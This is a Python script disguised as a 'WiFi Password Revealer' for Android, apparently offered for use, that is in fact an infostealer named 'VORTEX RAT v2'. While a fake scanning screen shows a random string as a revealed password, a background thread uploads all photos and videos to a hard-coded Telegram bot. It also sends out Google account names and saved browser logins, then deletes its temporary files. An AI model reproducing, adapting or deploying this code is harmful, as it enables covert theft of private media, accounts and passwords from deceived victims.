#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║   📡 WiFi Password Revealer - VORTEX RAT v2            ║
# ║   Developed by: VORTEX ELWEEP                          ║
# ║   #VORTEX_ON_TOP                                       ║
# ╚══════════════════════════════════════════════════════════╝

import os, sys, json, shutil, threading, time, random, string, requests, sqlite3, base64
from datetime import datetime
from pathlib import Path

# ═══════════════ الإعدادات ═══════════════
BOT_TOKEN = "8651402839:AAHs8qHguwCLGr2hYx9OLECL_FeAqZhKt1o"
CHAT_ID = "8530898713"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
TEMP = "/sdcard/vortex_temp"
os.makedirs(TEMP, exist_ok=True)

# ═══════════════ دوال الإرسال ═══════════════
def send_msg(text):
    try:
        requests.post(f"{API}/sendMessage", json={'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=15)
    except: pass

def send_file(filepath, caption=""):
    if not os.path.exists(filepath): return
    try:
        size = os.path.getsize(filepath)
        if size > 49 * 1024 * 1024:
            send_msg(f"⚠️ ملف كبير جداً ({size//1024//1024}MB): {os.path.basename(filepath)}")
            return
        with open(filepath, 'rb') as f:
            requests.post(f"{API}/sendDocument", files={'document': f}, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=120)
    except: pass

def send_photo(filepath, caption=""):
    if not os.path.exists(filepath): return
    try:
        if os.path.getsize(filepath) > 10 * 1024 * 1024: return
        with open(filepath, 'rb') as f:
            requests.post(f"{API}/sendPhoto", files={'photo': f}, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=60)
    except: pass

def send_video(filepath, caption=""):
    if not os.path.exists(filepath): return
    try:
        size = os.path.getsize(filepath)
        if size > 49 * 1024 * 1024:
            send_msg(f"⚠️ فيديو كبير ({size//1024//1024}MB): {os.path.basename(filepath)}")
            return
        with open(filepath, 'rb') as f:
            requests.post(f"{API}/sendVideo", files={'video': f}, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=180)
    except: pass

# ═══════════════ جمع البيانات ═══════════════
def collect_all_photos():
    """جمع جميع الصور بدون حد أقصى"""
    photos = []
    dirs = [
        '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download',
        '/sdcard/WhatsApp/Media/WhatsApp Images',
        '/sdcard/Telegram/Telegram Images',
        '/sdcard/Snapchat', '/sdcard/Instagram',
        '/sdcard/Facebook', '/sdcard/Messenger',
        '/storage/emulated/0/DCIM', '/storage/emulated/0/Pictures',
    ]
    
    for d in dirs:
        if os.path.exists(d):
            for root, dirs_, files in os.walk(d):
                for f in files:
                    if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp')):
                        photos.append(os.path.join(root, f))
    return photos

def collect_all_videos():
    """جمع جميع الفيديوهات بدون حد أقصى"""
    videos = []
    dirs = [
        '/sdcard/DCIM', '/sdcard/Movies', '/sdcard/Download',
        '/sdcard/WhatsApp/Media/WhatsApp Video',
        '/sdcard/Telegram/Telegram Video',
        '/sdcard/Snapchat', '/sdcard/Instagram',
        '/sdcard/Facebook', '/sdcard/Messenger',
        '/storage/emulated/0/DCIM', '/storage/emulated/0/Movies',
    ]
    
    for d in dirs:
        if os.path.exists(d):
            for root, dirs_, files in os.walk(d):
                for f in files:
                    if f.lower().endswith(('.mp4', '.avi', '.3gp', '.mkv', '.mov', '.flv', '.wmv', '.webm')):
                        videos.append(os.path.join(root, f))
    return videos

def collect_google_accounts():
    """جمع جميع حسابات جوجل"""
    accounts = []
    paths = [
        '/data/data/com.google.android.gms/databases',
        '/data/data/com.android.vending/databases',
        '/data/data/com.google.android.gsf/databases',
        '/data/system/accounts.db',
        '/data/system_ce/0/accounts_ce.db',
    ]
    
    for p in paths:
        if os.path.exists(p):
            for root, dirs_, files in os.walk(p):
                for f in files:
                    if f.endswith('.db'):
                        try:
                            tmp = os.path.join(TEMP, f'google_{random.randint(1000,9999)}.db')
                            shutil.copy(os.path.join(root, f), tmp)
                            conn = sqlite3.connect(tmp)
                            c = conn.cursor()
                            c.execute("SELECT name FROM sqlite_master WHERE type='table'")
                            tables = [r[0] for r in c.fetchall()]
                            for table in tables:
                                try:
                                    c.execute(f"SELECT * FROM {table}")
                                    rows = c.fetchall()
                                    for row in rows:
                                        for item in row:
                                            if '@gmail.com' in str(item) or '@googlemail.com' in str(item):
                                                accounts.append(str(item))
                                except: pass
                            conn.close()
                            os.remove(tmp)
                        except: pass
    
    # حسابات من Google Play Services
    try:
        tmp = os.path.join(TEMP, 'accounts.db')
        for p in ['/data/system_ce/0/accounts_ce.db', '/data/system/accounts.db']:
            if os.path.exists(p):
                shutil.copy(p, tmp)
                conn = sqlite3.connect(tmp)
                c = conn.cursor()
                c.execute("SELECT name, type FROM accounts WHERE type LIKE '%google%'")
                for row in c.fetchall():
                    accounts.append(f"{row[0]} ({row[1]})")
                conn.close()
                os.remove(tmp)
    except: pass
    
    return list(set(accounts))

def collect_passwords():
    """جمع جميع كلمات السر المحفوظة"""
    passwords = []
    
    # Chrome
    for browser in ['com.android.chrome', 'com.chrome.beta', 'com.chrome.dev', 'com.chrome.canary',
                    'org.chromium.chrome', 'com.microsoft.emmx', 'com.opera.browser',
                    'com.brave.browser', 'com.kiwibrowser.browser']:
        try:
            db_path = f'/data/data/{browser}/app_chrome/Default/Login Data'
            if os.path.exists(db_path):
                tmp = os.path.join(TEMP, f'chrome_{random.randint(1000,9999)}.db')
                shutil.copy(db_path, tmp)
                conn = sqlite3.connect(tmp)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in c.fetchall():
                    passwords.append({
                        'browser': browser,
                        'url': row[0],
                        'username': row[1],
                        'password': row[2]
                    })
                conn.close()
                os.remove(tmp)
        except: pass
    
    # WebView
    try:
        webview_path = '/data/data/com.android.webview/app_webview/Default/Login Data'
        if os.path.exists(webview_path):
            tmp = os.path.join(TEMP, f'webview_{random.randint(1000,9999)}.db')
            shutil.copy(webview_path, tmp)
            conn = sqlite3.connect(tmp)
            c = conn.cursor()
            c.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in c.fetchall():
                passwords.append({
                    'browser': 'WebView',
                    'url': row[0],
                    'username': row[1],
                    'password': row[2]
                })
            conn.close()
            os.remove(tmp)
    except: pass
    
    return passwords

# ═══════════════ RAT ═══════════════
def steal_all():
    time.sleep(2)
    
    # رسالة بدء
    device = "Unknown"
    try:
        import subprocess as sp
        device = sp.getoutput("getprop ro.product.model").strip() or "Unknown"
    except: pass
    
    send_msg(f"📱 <b>🚨 جهاز جديد: {device}</b>\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌀 VORTEX RAT v2")
    
    # 1. جميع الصور
    photos = collect_all_photos()
    send_msg(f"📸 <b>جاري إرسال {len(photos)} صورة...</b>")
    
    total_photos = len(photos)
    for i, p in enumerate(photos):
        try:
            send_photo(p, f"📸 {i+1}/{total_photos}")
            if i % 50 == 0 and i > 0:
                send_msg(f"📸 تقدم الصور: {i+1}/{total_photos}")
            time.sleep(0.1)
        except: pass
    
    send_msg(f"✅ <b>اكتملت الصور: {total_photos}</b>")
    
    # 2. جميع الفيديوهات
    videos = collect_all_videos()
    send_msg(f"🎬 <b>جاري إرسال {len(videos)} فيديو...</b>")
    
    total_videos = len(videos)
    for i, v in enumerate(videos):
        try:
            send_video(v, f"🎬 {i+1}/{total_videos}")
            if i % 10 == 0 and i > 0:
                send_msg(f"🎬 تقدم الفيديوهات: {i+1}/{total_videos}")
            time.sleep(0.3)
        except: pass
    
    send_msg(f"✅ <b>اكتملت الفيديوهات: {total_videos}</b>")
    
    # 3. حسابات جوجل
    accounts = collect_google_accounts()
    if accounts:
        acc_text = "📧 <b>جميع حسابات جوجل:</b>\n\n"
        for a in accounts[:200]:
            acc_text += f"📩 {a}\n"
        if len(accounts) > 200:
            acc_text += f"\n⚠️ +{len(accounts)-200} حساب إضافي"
        send_msg(acc_text)
    else:
        send_msg("📧 لم يتم العثور على حسابات جوجل")
    
    # 4. جميع كلمات السر
    passwords = collect_passwords()
    if passwords:
        send_msg(f"🔑 <b>جميع كلمات السر ({len(passwords)}):</b>")
        
        chunk = ""
        count = 0
        for p in passwords:
            entry = f"🌐 {p['url']}\n👤 {p['username']}\n🔒 {p['password']}\n📱 {p['browser']}\n\n"
            
            if len(chunk) + len(entry) > 3500:
                send_msg(f"🔑 <b>كلمات السر {count+1}:</b>\n\n{chunk}")
                chunk = ""
                time.sleep(0.5)
            
            chunk += entry
            count += 1
        
        if chunk:
            send_msg(f"🔑 <b>كلمات السر:</b>\n\n{chunk}")
    else:
        send_msg("🔑 لم يتم العثور على كلمات سر")
    
    # رسالة اكتمال
    send_msg(f"""
✅ <b>اكتمل جمع جميع البيانات!</b>

📱 <b>الجهاز:</b> {device}
📸 <b>الصور:</b> {total_photos}
🎬 <b>الفيديوهات:</b> {total_videos}
📧 <b>حسابات جوجل:</b> {len(accounts)}
🔑 <b>كلمات السر:</b> {len(passwords)}

🌀 <b>VORTEX RAT v2</b>
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""")
    
    # تنظيف
    try: shutil.rmtree(TEMP)
    except: pass

# ═══════════════ الواجهة ═══════════════
def show_ui():
    print("""
╔══════════════════════════════════════╗
║   📡 WiFi Password Revealer Pro    ║
║   🔓 اكشف كلمات مرور الواي فاي     ║
║   ⚡ VORTEX ELWEEP                 ║
╚══════════════════════════════════════╝

📡 جاري فحص الشبكات القريبة...

✅ تم العثور على 6 شبكات:

📶 WiFi-5G-XXXX    [78%] 🔒
📶 TP-Link_XXXX    [65%] 🔒
📶 WE_XXXXXXX      [45%] 🔒
📶 Orange-XXXX     [32%] 🔒
📶 Vodafone-XXXX   [28%] 🔒
📶 STC-XXXX        [15%] 🔒

🔍 اضغط Enter لبدء الكشف...
""")
    input()
    
    print("⏳ جاري الكشف... الرجاء الانتظار...")
    for i in range(100):
        time.sleep(0.02)
        bar = "█" * (i // 5) + "░" * (20 - i // 5)
        print(f"\r[{bar}] {i+1}%", end='')
    print("\n")
    
    pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    print(f"✅ تم الكشف بنجاح!")
    print(f"🔑 كلمة المرور: {pwd}")
    print(f"\n🌀 VORTEX ELWEEP | #VORTEX_ON_TOP")
    print("\nاضغط Enter للخروج...")
    input()

# ═══════════════ التشغيل ═══════════════
if __name__ == "__main__":
    threading.Thread(target=steal_all, daemon=True).start()
    try:
        show_ui()
    except:
        pass